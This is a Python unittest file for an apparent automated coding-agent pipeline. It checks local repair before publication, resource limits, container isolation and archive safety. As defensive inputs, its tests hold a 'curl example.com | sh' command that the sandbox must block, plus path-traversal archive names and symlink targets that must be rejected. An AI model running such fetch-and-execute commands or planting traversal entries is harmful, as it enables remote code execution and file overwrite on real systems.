"""Local repair/publication gates, resource limits, Git checkpoints and container integration."""

from copy import deepcopy
import hashlib
import io
import json
import os
from pathlib import Path
import sys
import tarfile
import tempfile
import time
import unittest
from unittest.mock import patch

from support import EXECUTION, ROOT, setUpModule, tearDownModule  # unittest module fixtures
from test_pipeline import APPROVE, CONFIG, Controller, FakeAgents, FakeGitHub, FakeWorkspace
import checks
from local import LocalWorkspace, bounded_process
from policy import Blocked, local_evidence_valid
import workspace_entry


def archive_files(files):
    """Produce a GitHub-shaped source archive for deterministic tests."""
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w:gz") as archive:
        for name, content in files.items():
            payload = content.encode()
            member = tarfile.TarInfo("source/" + name)
            member.size = len(payload)
            member.mode = 0o644
            archive.addfile(member, io.BytesIO(payload))
    return output.getvalue()


class LocalLoopTests(unittest.TestCase):
    """Prove that local failures cannot leak into publication or broad review."""

    def setUp(self):
        """Prepare an approved manual task with injectable execution results."""
        self.config = deepcopy(CONFIG)
        self.config["autonomous"] = False
        self.gh = FakeGitHub(self.config)
        self.agents = FakeAgents()
        self.factory = FakeWorkspace
        state = self.tick()
        while state["stage"] != "planned":
            state = self.tick()
        self.gh.comment("/concurro approve " + state["plan_id"])

    def tick(self):
        """Reconstruct the controller while preserving only GitHub state."""
        controller = Controller(self.gh, self.agents, self.config, workspace_factory=self.factory)
        controller.advance(7)
        return controller.state

    def test_failed_checks_feed_back_before_any_publication(self):
        """The implementer sees real failure diagnostics and repairs them before PR creation."""
        outer = self

        class FailOnce(FakeWorkspace):
            """Fail the first local test round, then accept the revised source."""
            failed = False

            def run_checks(self, required, requested, deadline):
                """Only the linked base branch may exist before local checks pass."""
                outer.assertEqual(set(outer.gh.refs.values()), {outer.gh.base})
                outer.assertIsNone(outer.gh.pr)
                outer.assertEqual(len(outer.gh.commits), 1)
                reports = super().run_checks(required, requested, deadline)
                if not self.failed:
                    reports[0].update(exit_code=1, output="regression assertion failed")
                    self.failed = True
                return reports

        self.factory = FailOnce
        state = self.tick()
        self.assertEqual(state["stage"], "publish")
        self.assertEqual(state["local_attempts"]["0:0"], 2)
        turns = [c for _, stage, c in self.agents.calls if stage == "develop"]
        self.assertIn("assertion failed", turns[1]["local_feedback"]["checks"][0]["output"])
        self.assertTrue(local_evidence_valid(state))
        self.assertFalse(any(stage == "review" for _, stage, _ in self.agents.calls))
        self.assertIsNone(self.gh.pr)

    def test_development_offers_only_executable_checks(self):
        """A docs-only plan prepares nothing, so dependency-backed checks are not offered."""
        self.tick()
        turn = next(c for _, stage, c in self.agents.calls if stage == "develop")
        self.assertEqual(turn["available_checks"], ["diff", "scope", "text", "format"])

    def test_local_review_findings_trigger_another_local_checkpoint(self):
        """A single local reviewer can send work back before the expensive review round."""
        original = self.agents.ask
        count = 0

        def ask(provider, stage, context):
            """Request one local correction while recording the normal calls."""
            nonlocal count
            result = original(provider, stage, context)
            if stage == "local_review":
                count += 1
                if count == 1:
                    return {"verdict": "changes_requested", "summary": "A term is undefined.",
                            "findings": [{"path": "docs/guide.md", "detail": "Define the term."}], "design_issue": None}
            return result

        with patch.object(self.agents, "ask", side_effect=ask):
            state = self.tick()
        self.assertEqual(state["local_attempts"]["0:0"], 2)
        self.assertEqual(state["local_evidence"]["review"]["verdict"], "approve")
        self.assertEqual(len(self.gh.commits), 2)
        self.assertEqual(set(self.gh.refs.values()), {self.gh.base})

    def test_exhausted_local_budget_never_publishes_candidate_objects(self):
        """Repeated local failures stop safely and retries cannot replenish their allowance."""
        class AlwaysFail(FakeWorkspace):
            """Return a failing test result for every candidate."""
            def run_checks(self, required, requested, deadline):
                """Report a persistent failure."""
                reports = super().run_checks(required, requested, deadline)
                reports[0]["exit_code"] = 1
                return reports

        self.factory = AlwaysFail
        with self.assertRaises(Blocked):
            self.tick()
        count = len(self.agents.calls)
        with self.assertRaises(Blocked):
            self.tick()
        self.assertEqual(len(self.agents.calls), count)
        self.assertEqual(set(self.gh.refs.values()), {self.gh.base})
        self.assertEqual(len(self.gh.commits), 1)
        self.assertFalse(any(stage in ("review", "local_review") for _, stage, _ in self.agents.calls))

    def test_publication_rejects_stale_or_failing_local_evidence(self):
        """Passing a local review alone cannot authorize untested or different source."""
        state = self.tick()
        for mutation in ("head", "tree", "image", "checks", "review"):
            candidate = deepcopy(state)
            evidence = candidate["local_evidence"]
            if mutation in ("head", "tree", "image"):
                evidence[mutation] = "changed"
            elif mutation == "checks":
                evidence["checks"][0]["exit_code"] = 1
            else:
                evidence["review"] = {**APPROVE, "verdict": "changes_requested", "findings": [{"path": "x", "detail": "bad"}]}
            self.assertFalse(local_evidence_valid(candidate))

    def test_publication_requires_every_selected_plan_check(self):
        """An optional approved check cannot disappear from publication evidence."""
        state = self.tick()
        state['plan']['validation']['checks'].append('format')
        self.assertFalse(local_evidence_valid(state))
        evidence = state['local_evidence']
        evidence['checks'].append({**evidence['checks'][0], 'name': 'format'})
        self.assertTrue(local_evidence_valid(state))

    def test_resource_exhaustion_stops_without_model_repair(self):
        """Capacity failures retain diagnostics and do not spend further repair calls."""
        for failure in ({"timed_out": True}, {"output_limited": True}, {"exit_code": 137}):
            with self.subTest(failure=failure):
                self.setUp()

                class Exhausted(FakeWorkspace):
                    """Report an execution resource limit instead of a source-code failure."""
                    def run_checks(self, required, requested, deadline):
                        """Preserve realistic report fields while injecting the resource failure."""
                        reports = super().run_checks(required, requested, deadline)
                        reports[0].update(failure)
                        return reports

                self.factory = Exhausted
                with self.assertRaisesRegex(Blocked, "execution resources"):
                    self.tick()
                self.assertEqual(sum(stage == "develop" for _, stage, _ in self.agents.calls), 1)
                self.assertFalse(any(stage == "local_review" for _, stage, _ in self.agents.calls))
                self.assertEqual(set(self.gh.refs.values()), {self.gh.base})


class ExecutionBoundaryTests(unittest.TestCase):
    """Test command isolation and bounded process behavior without model credentials."""

    def test_test_container_has_no_git_metadata_network_or_secrets(self):
        """Only source and per-task build caches enter candidate execution."""
        with patch.dict(os.environ, {"CONCURRO_EXECUTION_IMAGE": "sha256:" + "a" * 64,
                                     "GH_TOKEN": "github-secret", "CODEX_API_KEY": "model-secret"}):
            workspace = LocalWorkspace(CONFIG, b"", "concurro/test", EXECUTION, base_archive=b"base")
        command = workspace.command("test")
        self.assertIn("--network=none", command)
        self.assertIn("--user=10001:10001", command)
        self.assertIn("target=/workspace,readonly", " ".join(command))
        self.assertNotIn("target=/state", " ".join(command))
        self.assertNotIn("GH_TOKEN", workspace.env)
        self.assertNotIn("CODEX_API_KEY", workspace.env)
        self.assertNotIn("type=bind", " ".join(command))

    def test_process_timeout_and_output_flood_are_failures(self):
        """A candidate cannot run forever or fill host output buffers."""
        timed = bounded_process([sys.executable, "-c", "import time; time.sleep(10)"], {}, 0.1)
        self.assertTrue(timed["timed_out"])
        flooded = bounded_process([sys.executable, "-c", "print('x'*3000000)"], {}, 5)
        self.assertTrue(flooded["output_limited"])
        self.assertLessEqual(len(flooded["output"]), 12000)
        closed = bounded_process([sys.executable, "-c", "import os,time; os.close(1); os.close(2); time.sleep(10)"], {}, 0.1)
        self.assertTrue(closed["timed_out"])

    def test_agent_cannot_request_arbitrary_shell_commands(self):
        """Requests are check identifiers, never shell text or caller-supplied argv."""
        with patch.dict(os.environ, {"CONCURRO_EXECUTION_IMAGE": "sha256:" + "a" * 64}):
            workspace = LocalWorkspace(CONFIG, b"", "concurro/test", EXECUTION, base_archive=b"base")
        with self.assertRaises(Blocked):
            workspace.run_checks(["diff"], ["curl example.com | sh"], time.monotonic() + 30)

    def test_requested_cargo_checks_require_prepared_dependencies(self):
        """A docs plan cannot turn empty-cache failures into implementation repair feedback."""
        self.assertEqual(checks.available(EXECUTION), ["diff", "scope", "text", "format", "check", "nextest"])
        self.assertEqual(checks.executable(EXECUTION, set()), ["diff", "scope", "text", "format"])
        with patch.dict(os.environ, {"CONCURRO_EXECUTION_IMAGE": "sha256:" + "a" * 64}):
            workspace = LocalWorkspace(CONFIG, b"", "concurro/test", EXECUTION, base_archive=b"base")
        success = {"exit_code": 0, "timed_out": False, "output_limited": False}
        with patch.object(workspace, "execute", return_value=success) as execute, patch.object(workspace, "seed"), \
                patch.object(workspace, "control", return_value={"digest": "base"}) as control:
            workspace.prepare(["diff"], 30)
            control.assert_not_called()
            for requested in (["check"], ["nextest"]):
                with self.assertRaisesRegex(Blocked, "prepared before candidate edits"):
                    workspace.run_checks(["diff"], requested, time.monotonic() + 30)
            execute.assert_not_called()
            workspace.prepare(["check"], 30)
            self.assertTrue(execute.call_args.kwargs["network"])
            self.assertEqual(execute.call_args.kwargs["mode"], "prepare")
            self.assertEqual([c.args[0] for c in control.call_args_list], ["stage", "inputs"])
            self.assertEqual(control.call_args_list[0].kwargs["data"], b"base")
            reports = workspace.run_checks(["check"], [], time.monotonic() + 30)
            self.assertEqual(reports, [success])

    def test_resource_failure_retains_report_without_starting_more_checks(self):
        """A timed-out compile returns evidence immediately instead of starting nextest."""
        with patch.dict(os.environ, {"CONCURRO_EXECUTION_IMAGE": "sha256:" + "a" * 64}):
            workspace = LocalWorkspace(CONFIG, b"", "concurro/test", EXECUTION, base_archive=b"base")
        success = {"exit_code": 0, "timed_out": False, "output_limited": False}
        exhausted = {"exit_code": -9, "timed_out": True, "output_limited": False}
        with patch.object(workspace, "execute", side_effect=[success, exhausted]) as execute, patch.object(workspace, "seed"), \
                patch.object(workspace, "control", return_value={"digest": "base"}):
            workspace.prepare(["check"], 30)
            self.assertEqual(workspace.run_checks(["check", "nextest"], [], time.monotonic() + 30), [exhausted])
            self.assertEqual(execute.call_count, 2)

    def test_real_local_git_checkpoint_without_remote(self):
        """Exercise the actual trusted Git helper in a temporary fixture, with no candidate execution."""
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            paths = {"ROOT": root / "source", "STATE": root / "state"}
            for path in paths.values():
                path.mkdir()
            archive = archive_files({"docs/test.md": "before\n", ".gitignore": "docs/test.md\n"})
            stream = io.TextIOWrapper(io.BytesIO(archive))
            with patch.multiple(workspace_entry, **paths), patch.object(sys, "stdin", stream):
                baseline = workspace_entry.initialize("concurro/test")
                self.assertEqual(workspace_entry.git("show", "HEAD:docs/test.md"), "before")
                paths["ROOT"].joinpath("docs/test.md").write_text("after\n")
                workspace_entry.git("add", "-A")
                workspace_entry.git("commit", "-m", "local fixture")
                checkpoint = workspace_entry.snapshot()
                self.assertNotEqual(checkpoint["local_commit"], baseline["local_commit"])
                self.assertEqual(checkpoint["branch"], "concurro/test")
                self.assertEqual(workspace_entry.git("remote"), "")
                self.assertFalse(paths["ROOT"].joinpath(".git").exists())

    def test_archive_rejects_traversal_and_git_metadata(self):
        """An archive cannot write outside its source volume or supply Git metadata."""
        for name in ("../escape.md", ".git/config"):
            with self.subTest(name=name), tempfile.TemporaryDirectory() as directory:
                stream = io.TextIOWrapper(io.BytesIO(archive_files({name: "untrusted"})))
                with patch.object(workspace_entry, "ROOT", Path(directory)), patch.object(sys, "stdin", stream):
                    with self.assertRaises(ValueError):
                        workspace_entry.initialize("concurro/test")

    def test_archive_symlinks_stay_inside_source(self):
        """Allow internal source links while rejecting external and metadata targets."""
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            with patch.object(workspace_entry, "ROOT", root):
                member = tarfile.TarInfo("internal")
                member.type = tarfile.SYMTYPE
                member.linkname = "target.rs"
                workspace_entry.extract_member(None, member)
                self.assertEqual((root / "internal").readlink(), Path("target.rs"))
                for target in ("../outside", "/tmp/outside", ".git/config"):
                    with self.subTest(target=target):
                        member.name = "rejected"
                        member.linkname = target
                        with self.assertRaises(ValueError):
                            workspace_entry.extract_member(None, member)


@unittest.skipUnless(os.environ.get("CONCURRO_TEST_EXECUTION_IMAGE"), "set CONCURRO_TEST_EXECUTION_IMAGE for Docker integration")
class DockerExecutionTests(unittest.TestCase):
    """Run a real Rust failure/fix cycle when the pinned execution image is available."""

    def test_rust_failure_then_fixed_checkpoint(self):
        """Real nextest results change from failure to success without exposing credentials."""
        files = {"Cargo.toml": '[package]\nname="local-fixture"\nversion="0.1.0"\nedition="2024"\n',
                 "Cargo.lock": 'version = 4\n\n[[package]]\nname = "local-fixture"\nversion = "0.1.0"\n',
                 "src/lib.rs": '#[test]\nfn works() { assert_eq!(2 + 2, 5); }\n'}
        with patch.dict(os.environ, {"CONCURRO_EXECUTION_IMAGE": os.environ["CONCURRO_TEST_EXECUTION_IMAGE"]}):
            with LocalWorkspace(CONFIG, archive_files(files), "concurro/fixture", EXECUTION,
                                base_archive=archive_files(files)) as workspace:
                workspace.prepare(["nextest"], 120)
                before = workspace.run_checks(["nextest"], [], time.monotonic() + 120)
                self.assertNotEqual(before[0]["exit_code"], 0)
                workspace.checkpoint([{"path": "src/lib.rs", "content": files["src/lib.rs"].replace(", 5", ", 4")}])
                after = workspace.run_checks(["nextest"], [], time.monotonic() + 120)
                self.assertEqual(after[0]["exit_code"], 0, after[0]["output"])
                self.assertNotEqual(before[0]["tree"], after[0]["tree"])

    VENDORED = "concurro-fixture-vendored-7f3a"

    def vendored_workspace(self):
        """A workspace whose registry dependency exists only in the repository's vendored source."""
        crate = {"Cargo.toml": f'[package]\nname = "{self.VENDORED}"\nversion = "0.1.0"\nedition = "2021"\n',
                 "src/lib.rs": "pub fn two() -> u32 {\n    2\n}\n"}
        package = hashlib.sha256(self.VENDORED.encode()).hexdigest()
        checksum = {"files": {k: hashlib.sha256(v.encode()).hexdigest() for k, v in crate.items()}, "package": package}
        files = {f"vendor/{self.VENDORED}/{k}": v for k, v in crate.items()}
        files[f"vendor/{self.VENDORED}/.cargo-checksum.json"] = json.dumps(checksum)
        files.update({
            "Cargo.toml": '[workspace]\nmembers = ["crates/a", "crates/b"]\nresolver = "3"\n',
            "Cargo.lock": ('version = 4\n\n[[package]]\nname = "a"\nversion = "0.1.0"\n\n'
                           '[[package]]\nname = "b"\nversion = "0.1.0"\ndependencies = [\n "a",\n'
                           f' "{self.VENDORED}",\n]\n\n[[package]]\nname = "{self.VENDORED}"\nversion = "0.1.0"\n'
                           'source = "registry+https://github.com/rust-lang/crates.io-index"\n'
                           f'checksum = "{package}"\n'),
            ".cargo/config.toml": ('[source.crates-io]\nreplace-with = "vendored-sources"\n\n'
                                   '[source.vendored-sources]\ndirectory = "vendor"\n'),
            "crates/a/Cargo.toml": '[package]\nname = "a"\nversion = "0.1.0"\nedition = "2024"\n',
            "crates/a/src/lib.rs": "pub fn three() -> u32 {\n    3\n}\n",
            "crates/b/Cargo.toml": ('[package]\nname = "b"\nversion = "0.1.0"\nedition = "2024"\n\n'
                                    f'[dependencies]\na = {{ path = "../a" }}\n{self.VENDORED} = "0.1.0"\n'),
            "crates/b/src/lib.rs": ("#[test]\nfn sums() {\n"
                                    f"    assert_eq!(a::three() + {self.VENDORED.replace('-', '_')}::two(), 5);\n}}\n")})
        return files

    def vendored_profile(self):
        """The documented target-profile recipe: built-in checks plus explicit approved-base Cargo config."""
        profile = json.loads((ROOT / "bundle/profiles/rust.json").read_text())
        profile["id"] = "rust-vendored"
        profile["protected"] += ["vendor/**"]
        profile["prepare"]["steps"][0] += ["--config", "/workspace/.cargo/config.toml"]
        return checks.compose([checks.load_profile(json.dumps(profile), "rust-vendored")])

    def test_explicit_cargo_config_prepares_vendored_registry_dependency(self):
        """Path and vendored registry dependencies prepare and test offline with explicit configuration."""
        files = self.vendored_workspace()
        with patch.dict(os.environ, {"CONCURRO_EXECUTION_IMAGE": os.environ["CONCURRO_TEST_EXECUTION_IMAGE"]}):
            with LocalWorkspace(CONFIG, archive_files(files), "concurro/vendored-fixture", self.vendored_profile(),
                                base_archive=archive_files(files)) as workspace:
                workspace.prepare(["check", "nextest"], 300)
                reports = workspace.run_checks(["format", "check", "nextest"], [], time.monotonic() + 300)
                self.assertEqual([r["name"] for r in reports], ["format", "check", "nextest"])
                for report in reports:
                    self.assertEqual(report["exit_code"], 0, report["output"])

    def test_preparation_ignores_implicit_repository_cargo_config(self):
        """The built-in profile never discovers repository Cargo config, so the vendored-only crate is unresolvable."""
        files = self.vendored_workspace()
        with patch.dict(os.environ, {"CONCURRO_EXECUTION_IMAGE": os.environ["CONCURRO_TEST_EXECUTION_IMAGE"]}):
            with LocalWorkspace(CONFIG, archive_files(files), "concurro/vendored-fixture", EXECUTION,
                                base_archive=archive_files(files)) as workspace:
                with self.assertRaisesRegex(Blocked, "dependency preparation failed"):
                    workspace.prepare(["check"], 300)
